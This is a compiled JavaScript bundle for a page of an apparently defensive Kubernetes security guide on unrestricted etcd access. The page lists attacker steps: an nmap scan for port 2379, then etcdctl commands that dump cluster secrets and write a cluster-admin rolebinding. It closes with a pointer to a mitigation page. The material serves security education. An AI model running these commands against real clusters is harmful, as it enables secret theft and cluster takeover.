"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[2741],{8453:(e,t,s)=>{s.d(t,{R:()=>i,x:()=>a});var r=s(6540);const c={},n=r.createContext(c);function i(e){const t=r.useContext(n);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:i(e.components),r.createElement(n.Provider,{value:t},e.children)}},9366:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"attack_vectors/unrestricted_etcd_access","title":"Unrestricted etcd Access","description":"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster.","source":"@site/docs/attack_vectors/unrestricted_etcd_access.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/unrestricted_etcd_access","permalink":"/k8s_security/docs/attack_vectors/unrestricted_etcd_access","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/unrestricted_etcd_access.md","tags":[],"version":"current","sidebarPosition":11,"frontMatter":{"sidebar_position":11,"title":"Unrestricted etcd Access","description":"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."},"sidebar":"guidesSidebar","previous":{"title":"Traffic Hijacking","permalink":"/k8s_security/docs/attack_vectors/traffic_hijacking"},"next":{"title":"Misconfigured Admission Controllers","permalink":"/k8s_security/docs/attack_vectors/misconfigured_admission_controllers"}}');var c=s(4848),n=s(8453);const i={sidebar_position:11,title:"Unrestricted etcd Access",description:"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."},a="Unrestricted etcd Access",o={},d=[{value:"Exploitation Steps: Extracting Secrets from etcd",id:"exploitation-steps-extracting-secrets-from-etcd",level:2},{value:"Step 1: Scan for Open etcd Endpoints",id:"step-1-scan-for-open-etcd-endpoints",level:3},{value:"Step 2: Query etcd for Cluster Data",id:"step-2-query-etcd-for-cluster-data",level:3},{value:"Step 3: Extract Kubernetes Secrets",id:"step-3-extract-kubernetes-secrets",level:3},{value:"Step 4: Modify Cluster Configuration",id:"step-4-modify-cluster-configuration",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,n.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(t.header,{children:(0,c.jsx)(t.h1,{id:"unrestricted-etcd-access",children:"Unrestricted etcd Access"})}),"\n",(0,c.jsxs)(t.p,{children:[(0,c.jsx)(t.strong,{children:"etcd"})," is the ",(0,c.jsx)(t.strong,{children:"key-value store"})," used by Kubernetes to store ",(0,c.jsx)(t.strong,{children:"configuration data, secrets, and cluster state"}),". If ",(0,c.jsx)(t.strong,{children:"unrestricted access"})," is allowed, attackers can retrieve sensitive information, escalate privileges, and take full control of the cluster."]}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"exploitation-steps-extracting-secrets-from-etcd",children:"Exploitation Steps: Extracting Secrets from etcd"}),"\n",(0,c.jsxs)(t.p,{children:["An attacker gains access to an ",(0,c.jsx)(t.strong,{children:"unprotected etcd instance"})," and extracts sensitive Kubernetes data."]}),"\n",(0,c.jsx)(t.h3,{id:"step-1-scan-for-open-etcd-endpoints",children:"Step 1: Scan for Open etcd Endpoints"}),"\n",(0,c.jsxs)(t.p,{children:["The attacker checks for an ",(0,c.jsx)(t.strong,{children:"exposed etcd API"})," on port ",(0,c.jsx)(t.strong,{children:"2379"}),":"]}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"nmap -p 2379 --open <cluster-ip-range>\n"})}),"\n",(0,c.jsx)(t.p,{children:"If an open etcd instance is found, the attacker proceeds."}),"\n",(0,c.jsx)(t.h3,{id:"step-2-query-etcd-for-cluster-data",children:"Step 2: Query etcd for Cluster Data"}),"\n",(0,c.jsx)(t.p,{children:"If authentication is not enforced, the attacker directly queries etcd for Kubernetes secrets:"}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get / --prefix --keys-only\n"})}),"\n",(0,c.jsx)(t.h3,{id:"step-3-extract-kubernetes-secrets",children:"Step 3: Extract Kubernetes Secrets"}),"\n",(0,c.jsx)(t.p,{children:"The attacker retrieves stored credentials, service tokens, and API keys:"}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:"ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get /registry/secrets --prefix\n"})}),"\n",(0,c.jsxs)(t.p,{children:["If etcd stores ",(0,c.jsx)(t.strong,{children:"admin credentials"}),", the attacker gains ",(0,c.jsx)(t.strong,{children:"full cluster control"}),"."]}),"\n",(0,c.jsx)(t.h3,{id:"step-4-modify-cluster-configuration",children:"Step 4: Modify Cluster Configuration"}),"\n",(0,c.jsxs)(t.p,{children:["If write access is enabled, the attacker modifies ",(0,c.jsx)(t.strong,{children:"Kubernetes RBAC settings"})," to escalate privileges:"]}),"\n",(0,c.jsx)(t.pre,{children:(0,c.jsx)(t.code,{className:"language-bash",children:'ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 put /registry/rbac/rolebindings/cluster-admin \'{"user": "attacker", "role": "cluster-admin"}\'\n'})}),"\n",(0,c.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,c.jsxs)(t.p,{children:["The attacker has ",(0,c.jsx)(t.strong,{children:"complete control over Kubernetes"}),", allowing them to ",(0,c.jsx)(t.strong,{children:"modify workloads, access secrets, and delete cluster resources"}),"."]}),"\n",(0,c.jsx)(t.hr,{}),"\n",(0,c.jsx)(t.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,c.jsxs)(t.p,{children:["To protect against ",(0,c.jsx)(t.strong,{children:"unrestricted etcd access"}),", follow the security best practices outlined in:"]}),"\n",(0,c.jsxs)(t.p,{children:["\u27a1 ",(0,c.jsx)(t.strong,{children:(0,c.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/etcd_security_mitigation",children:"Securing etcd in Kubernetes"})})]}),"\n",(0,c.jsxs)(t.p,{children:["This guide covers techniques such as ",(0,c.jsx)(t.strong,{children:"enforcing TLS encryption, restricting access with RBAC, securing backups, and isolating etcd from untrusted networks"})," to prevent unauthorized access."]})]})}function u(e={}){const{wrapper:t}={...(0,n.R)(),...e.components};return t?(0,c.jsx)(t,{...e,children:(0,c.jsx)(l,{...e})}):l(e)}}}]);